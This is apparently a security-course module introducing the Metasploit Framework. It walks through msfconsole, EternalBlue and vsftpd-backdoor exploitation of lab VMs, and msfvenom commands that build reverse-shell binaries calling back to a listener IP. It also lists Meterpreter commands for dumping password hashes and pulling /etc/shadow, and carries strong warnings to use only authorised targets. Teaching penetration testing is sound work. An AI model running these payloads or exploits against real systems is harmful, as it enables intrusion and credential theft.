# Metasploit basics

Up until now, every exploit you've written has been bespoke — a custom Python script, a `curl` one-liner, a hand-crafted payload. That works for the OWASP Top 10 and for most CTF challenges, but in real engagements you'll often face a known CVE on a known service, and re-implementing the exploit by hand is wasted time. The **Metasploit Framework** is the industry's open-source library of pre-written exploits, payloads, and post-exploitation modules, glued together with a console that lets you point and fire.

This module covers what Metasploit actually is, how the pieces fit together, and the smallest workflow you need to be productive. We do not run Metasploit against anything you don't own.

> **Authorized targets only.** Metasploit is offensive software. Pointing it at a host you don't own is a felony under IT Act 2000 §43 (unauthorized access), §66 (computer-related offences), and §66F (cyber-terrorism, if critical infrastructure is involved). Equivalent laws apply elsewhere (CFAA in the US, Computer Misuse Act in the UK). **Use it only on:** the deliberately-vulnerable VMs listed at the bottom of this module, TryHackMe boxes while on their VPN, HackTheBox boxes from the HTB VPN, your own lab built from VirtualBox / Docker, and engagements with **written** authorization.

---

## When to use Metasploit (and when not to)

| Situation | Use Metasploit? |
|-----------|-----------------|
| Known CVE on a known service version, exploit module already exists | Yes — it'll save hours |
| You need a stable post-exploit session with file transfer, port forwarding, screenshotting | Yes (Meterpreter) |
| You need to handle a reverse shell with TLS, session migration, multi-session | Yes (`multi/handler`) |
| You're writing a payload for a delivery vector you control | Yes (`msfvenom`) |
| The target has modern EDR | Probably not — default Metasploit payloads are flagged everywhere |
| You're learning how an exploit actually works | No — write it by hand first, *then* compare to the module |
| You're attacking a production system without explicit authorization | Never — illegal |

Metasploit teaches you frameworks. Writing exploits by hand teaches you protocols. You need both; we deliberately did the manual work in Weeks 2–4 first so this module makes sense.

---

## The four big pieces

```
┌─────────────────────────────────────────────────────────────────┐
│                      Metasploit Framework                       │
│                                                                 │
│  ┌────────────┐  ┌──────────┐  ┌─────────────┐  ┌────────────┐  │
│  │ msfconsole │  │ msfvenom │  │   modules   │  │  database  │  │
│  │            │  │          │  │             │  │            │  │
│  │ interactive│  │ standalone│ │ exploit/    │  │ hosts,     │  │
│  │ shell      │  │ payload  │  │ auxiliary/  │  │ services,  │  │
│  │            │  │ generator│  │ post/       │  │ creds,     │  │
│  │            │  │          │  │ payload/    │  │ loot       │  │
│  │            │  │          │  │ encoder/nop │  │            │  │
│  └────────────┘  └──────────┘  └─────────────┘  └────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

- **`msfconsole`** — the interactive shell where 95% of work happens.
- **`msfvenom`** — generates standalone payloads (EXEs, ELFs, shellcode, PHP one-liners) you can deliver outside the console.
- **Modules** — categorised library of exploits, scanners, payloads, post-exploitation actions, encoders.
- **Database** — Postgres backend that remembers every host, port, service, credential, and loot file across sessions.

---

## Module types

Every Metasploit operation runs through a module. The category prefix in the module path tells you what it does:

| Prefix | Purpose | Example |
|--------|---------|---------|
| `exploit/` | Triggers a vulnerability and delivers a payload | `exploit/multi/http/struts2_content_type_ognl` |
| `auxiliary/` | Information-gathering or non-exploit attacks (scanning, brute force, fuzzing, DoS) | `auxiliary/scanner/smb/smb_version` |
| `post/` | Run inside an active session for situational awareness, lateral movement, persistence | `post/multi/recon/local_exploit_suggester` |
| `payload/` | The code that runs *after* an exploit succeeds (a shell, Meterpreter, command) | `payload/linux/x64/meterpreter/reverse_tcp` |
| `encoder/` | Obfuscate a payload to bypass simple AV signatures (limited value against modern EDR) | `encoder/x86/shikata_ga_nai` |
| `nop/` | Generate "no-op" sleds for shellcode delivery (rarely needed today) | `nop/x86/single_byte` |
| `evasion/` | Generate full evasion binaries (Windows-focused) | `evasion/windows/windows_defender_exe` |

When you `search` in the console, the prefix is the first thing to look at — if you wanted to scan for SMB and got an `exploit/`, you'd be sending live attacks instead of probing.

---

## The msfconsole workflow

Once installed (`sudo apt install metasploit-framework`), start the console:

```bash
sudo msfdb init        # one-time: initialise the Postgres database
msfconsole
```

You'll see a banner and the `msf6 >` prompt. The seven commands below cover almost everything.

### 1. `search` — find a module

```
msf6 > search type:exploit platform:linux samba
msf6 > search cve:2017-0144
msf6 > search name:eternal
msf6 > search path:scanner/smb
```

Search supports filters: `type`, `platform`, `cve`, `name`, `path`, `author`, `rank` (the framework's own quality grade).

### 2. `use` — select a module

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

The prompt updates to reflect the active module. Tab-completion works for both module paths and option names.

### 3. `info` — read the docs

```
msf6 exploit(...) > info
```

Prints description, target platforms, required options, references (CVE, Microsoft KB, etc.) and reliability rank. Always read this before running. The `References` section usually has the original exploit advisory — read it to understand what's happening under the hood.

### 4. `show options` — see what to fill in

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s)
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain
   ...

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: thread, process, ...)
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port
```

`Required: yes` rows without a `Current Setting` are what you must `set` before running. `RHOSTS` is always the target; `LHOST`/`LPORT` are *your* listener.

### 5. `set` — configure options

```
msf6 exploit(...) > set RHOSTS 10.10.10.40
msf6 exploit(...) > set LHOST tun0          # interface name resolves to its IP
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > set payload windows/x64/meterpreter/reverse_tcp
```

Options stay set within the module. Use `setg` to set a value globally across modules (`setg LHOST tun0` is a common one — your callback IP rarely changes within an engagement).

### 6. `check` — see if the target is vulnerable

```
msf6 exploit(...) > check
[*] 10.10.10.40:445 - The target is vulnerable.
```

Not every module supports `check`. When it does, run it first. Sending a real exploit at a non-vulnerable target can crash the service.

### 7. `exploit` (or `run`)

```
msf6 exploit(...) > exploit
[*] Started reverse TCP handler on 10.9.0.5:4444
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[*] 10.10.10.40:445 - Authentication successful.
[+] 10.10.10.40:445 - Exploit completed, the target may be exploited.
[*] Sending stage (200774 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.9.0.5:4444 -> 10.10.10.40:49156) at 2026-05-27 11:23:14 +0530
meterpreter >
```

If it worked, you'll drop into a payload prompt. If not, the `[-]` lines tell you why — wrong target architecture, firewall in the way, exploit unreliable.

---

## Payloads

The exploit gets you in; the **payload** is what runs once you're in. Three orthogonal choices:

### Stager vs stageless

| | Stager (`/reverse_tcp`) | Stageless (`/reverse_tcp_stageless`) |
|-|-------------------------|--------------------------------------|
| Size | Tiny (a few hundred bytes) | Big (hundreds of KB) |
| How it works | Sends a small "stage 1" that downloads the real payload over the C2 channel | Ships the whole thing in one shot |
| When to use | Exploits with small buffer space, e.g. stack overflows | When the network path back to you is restrictive and you don't want a second connection |

Module path convention: `_tcp` is staged, `_tcp_stageless` carries the full payload.

### Reverse vs bind

| Direction | Use when |
|-----------|----------|
| **reverse** — victim connects back to you | Target is behind NAT/firewall (the common case) |
| **bind** — victim opens a port, you connect to it | You can reach the target but it can't reach you back |

In a typical CTF, the target is on a VPN behind NAT, so you use a reverse payload and listen with `LHOST`/`LPORT` set to your own VPN interface.

### Shell vs Meterpreter

| Payload | Pros | Cons |
|---------|------|------|
| `shell` (e.g. `linux/x64/shell_reverse_tcp`) | Tiny, no in-memory artefact beyond a `sh` process | Just a TTY — no built-in file transfer, no port forward, drops on TCP reset |
| `meterpreter` (e.g. `windows/x64/meterpreter/reverse_tcp`) | Full toolkit (`upload`, `download`, `portfwd`, `hashdump`, `migrate`, `screenshot`) | Larger, more in-memory artefacts, heavily signatured by AV/EDR |

For CTF and authorised lab work, Meterpreter is almost always what you want.

### Meterpreter — the commands you'll use

Once you have a `meterpreter >` prompt:

```
sysinfo                  # OS, hostname, architecture, domain
getuid                   # current effective user
ps                       # process list
migrate <PID>            # move into a different process (more stable)
shell                    # drop to a regular OS shell
download /etc/shadow .   # exfil a file to your CWD
upload exploit ./tmp/    # push a file to the target
portfwd add -l 8080 -p 80 -r 10.10.10.40   # forward target:80 to localhost:8080 on you
hashdump                 # dump local password hashes (Windows)
getsystem                # try four NT AUTHORITY\SYSTEM escalation tricks
background               # send the session to background; back to msf prompt
```

`background` followed by `sessions -l` lists your active sessions. `sessions -i 1` re-attaches to session 1.

---

## msfvenom — generating payloads outside the console

`msfvenom` produces the same payloads as `msfconsole` but as standalone artefacts. Useful when you have a delivery vector (file upload, code execution that writes to disk, a phishing payload in an authorised assessment) and just need the binary.

```bash
# Linux reverse shell ELF
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=10.9.0.5 LPORT=4444 \
  -f elf -o shell.elf

# Windows reverse Meterpreter EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.9.0.5 LPORT=4444 \
  -f exe -o payload.exe

# PHP one-liner for a writable upload form
msfvenom -p php/reverse_php LHOST=10.9.0.5 LPORT=4444 -f raw -o shell.php

# Raw shellcode (for use inside a C exploit)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.9.0.5 LPORT=4444 -f c

# Encoded x86 EXE (5 iterations of shikata_ga_nai)
msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... \
  -e x86/shikata_ga_nai -i 5 -f exe -o enc.exe
```

| Flag | Purpose |
|------|---------|
| `-p` | Payload module path |
| `-f` | Output format (`exe`, `elf`, `raw`, `c`, `python`, `psh`, `war`, `aspx`, `vba`, ...) |
| `-o` | Output file (otherwise stdout) |
| `-e` | Encoder (mostly cosmetic against modern AV) |
| `-i` | Encoder iterations |
| `-b` | Bad characters to avoid in shellcode (e.g. `\x00\x0a\x0d`) |
| `--platform` / `--arch` | Override target platform/architecture |
| `LHOST` / `LPORT` | Set listener address inline |

`msfvenom --list payloads` and `msfvenom --list formats` print what's available.

> **Detection note.** A default `msfvenom -p windows/meterpreter/reverse_tcp -f exe` is detected by **every** mainstream AV the moment it lands on disk. The framework's default encoders haven't fooled signature engines for ~10 years. Real evasion is its own discipline (covered conceptually in [detection-evasion-awareness.md](detection-evasion-awareness.md)); the point of msfvenom in this course is generating known payloads for known lab targets, not bypassing real defences.

---

## Receiving a callback — `multi/handler`

If a payload is delivered some other way (`msfvenom` output, manual reverse shell, a Week-3 RCE), you still need *something* listening to catch it. That's `multi/handler`:

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set ExitOnSession false   # keep listening for more
msf6 exploit(multi/handler) > exploit -j               # run as background job
```

`-j` runs it as a background job, so you can keep using the console while it waits. `jobs` lists running jobs; `jobs -K` kills them all.

The payload set on the handler **must match** what you generated. A `linux/x64/meterpreter/reverse_tcp` victim won't talk to a handler configured for `windows/x64/...`.

---

## Auxiliary modules — scanning and probing

`auxiliary/scanner/...` modules give you nmap-like capabilities inside the framework, with the bonus that results land directly in the Metasploit database.

```
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.10.10.0/24
msf6 auxiliary(scanner/smb/smb_version) > set THREADS 50
msf6 auxiliary(scanner/smb/smb_version) > run
```

A few you should know:

| Module | Purpose |
|--------|---------|
| `auxiliary/scanner/portscan/tcp` | TCP port sweep |
| `auxiliary/scanner/smb/smb_version` | SMB dialect + OS fingerprint |
| `auxiliary/scanner/ssh/ssh_login` | SSH credential check (one user, one password, or wordlists) |
| `auxiliary/scanner/http/dir_scanner` | HTTP directory brute-force |
| `auxiliary/scanner/ftp/anonymous` | Find FTP servers accepting anonymous login |
| `auxiliary/scanner/snmp/snmp_login` | SNMP community string test |
| `auxiliary/admin/...` | Service-specific abuse modules (e.g. `admin/mssql/mssql_exec`) |

---

## Post-exploitation modules

Once you have a session, `post/` modules run *inside* it. They use the session as their transport and don't need a separate exploit.

```
msf6 > sessions -l
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

Examples:

| Module | Purpose |
|--------|---------|
| `post/multi/recon/local_exploit_suggester` | Compares the session's OS against known local privesc exploits |
| `post/linux/gather/enum_configs` | Pulls common config files |
| `post/linux/gather/hashdump` | Dumps `/etc/shadow` (if root) |
| `post/windows/gather/credentials/credential_collector` | Mimikatz-style cred extraction |
| `post/windows/manage/migrate` | Move into a different process |

Most of these you'd do by hand in [post-exploitation.md](post-exploitation.md). The module versions are just shortcuts.

---

## Database integration

The database is the underrated half of the framework. Hook it up once and Metasploit remembers everything across sessions.

```
msf6 > db_status            # connected?
msf6 > workspace -a engagement-2026          # create a workspace per engagement
msf6 > workspace engagement-2026             # switch into it
msf6 > db_nmap -sV -sC 10.10.10.0/24         # nmap, results auto-import
msf6 > hosts                                 # everything db_nmap discovered
msf6 > services -p 445                       # filter by port
msf6 > vulns                                 # known-vulnerable findings
msf6 > creds                                 # captured credentials
msf6 > loot                                  # exfiltrated files
```

`db_nmap` is just `nmap` with its XML output piped into the framework's importer. The convenience is that subsequent modules can use `RHOSTS file:` queries against the database, and your final report can be pulled with one command.

---

## Sessions — managing multiple shells

In a real engagement you'll end up with several sessions in parallel.

```
msf6 > sessions -l                  # list
msf6 > sessions -i 2                # interact with session 2
meterpreter > background            # send back to msf
msf6 > sessions -k 3                # kill session 3
msf6 > sessions -u 5                # upgrade a shell session to Meterpreter
```

A common pattern: catch a shell with `multi/handler`, then `sessions -u <id>` upgrades it to Meterpreter, then `background` to keep going.

---

## A worked example — Metasploitable 2, vsftpd 2.3.4 backdoor

[Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2/) is a deliberately-vulnerable Ubuntu VM published by Rapid7. Spin it up on host-only networking (so it's unreachable from anywhere but your own machine) and treat it as the authorised target.

```
msf6 > workspace -a msf2
msf6 > db_nmap -sV 192.168.56.101
[+] Host 192.168.56.101 added.
[+] Service: 21/tcp open ftp vsftpd 2.3.4
...

msf6 > search vsftpd 2.3.4
   exploit/unix/ftp/vsftpd_234_backdoor   2011-07-03  excellent  No   VSFTPD v2.3.4 Backdoor Command Execution

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > check
[*] The target is vulnerable.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] Banner: 220 (vsFTPd 2.3.4)
[*] USER: 331 Please specify the password.
[+] Backdoor service has been spawned, handling...
[+] UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened ...
id
uid=0(root) gid=0(root)
```

That session is a plain `sh` shell. `sessions -u 1` would upgrade it to Meterpreter. Note the rank — `excellent` means the exploit is reliable; `manual` and `low` mean expect crashes.

---

## Authorised practice targets

These are the only places you should run Metasploit:

| Target | Why it's safe |
|--------|---------------|
| **Metasploitable 2** | Rapid7's intentionally-vulnerable Ubuntu VM. Run on a host-only network. |
| **Metasploitable 3** | Updated Windows + Ubuntu lab, packer-built locally. |
| **TryHackMe — Metasploit Intro / Metasploit Exploitation / Metasploit Meterpreter** | Authorised on their VPN |
| **TryHackMe — Blue, Ice, Steel Mountain** | Walkthroughs of Metasploit-driven boxes |
| **HackTheBox Starting Point** | Each box is explicitly in-scope while on HTB VPN |
| **Your own VirtualBox lab** | You wrote the consent form yourself |

Pointing `msfconsole` at anything else — the IIT network, a cloud VM you found by Shodan, an old router on your hostel Wi-Fi — is a criminal act, not a learning exercise.

---

## Common gotchas

| Symptom | Cause |
|---------|-------|
| `Exploit completed, but no session was created` | Wrong payload arch (x86 vs x64), firewall ate the callback, exploit landed but payload couldn't bind |
| `LHOST` unreachable | You set `LHOST` to a NAT'd address; on TryHackMe/HTB it should be your `tun0` IP |
| `db_status` says no connection | Run `sudo msfdb init` once; restart console |
| Module appears in `search` but `use` fails | Library dependency missing — try `apt update && apt install metasploit-framework` |
| Meterpreter session dies immediately | AV killed it; or you didn't `migrate` and the host process exited |
| `check` says vulnerable, `exploit` fails | Service is patched but banner still says old version; or rate-limited |

---

## Further reading

- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/) — free, exhaustive course by Offensive Security.
- [Rapid7 Metasploit documentation](https://docs.rapid7.com/metasploit/) — official reference.
- [TryHackMe — Metasploit path](https://tryhackme.com/) — hands-on, free for several rooms.
- `msfconsole` `help <topic>` — built-in docs that no one reads enough.
- [HackTricks — Metasploit cheatsheet](https://book.hacktricks.xyz/) — common commands in one place.

---

## Next module

[privilege-escalation.md](privilege-escalation.md) — Metasploit gets you a foothold. The next module covers the very next problem: how to turn that low-privilege shell into root.
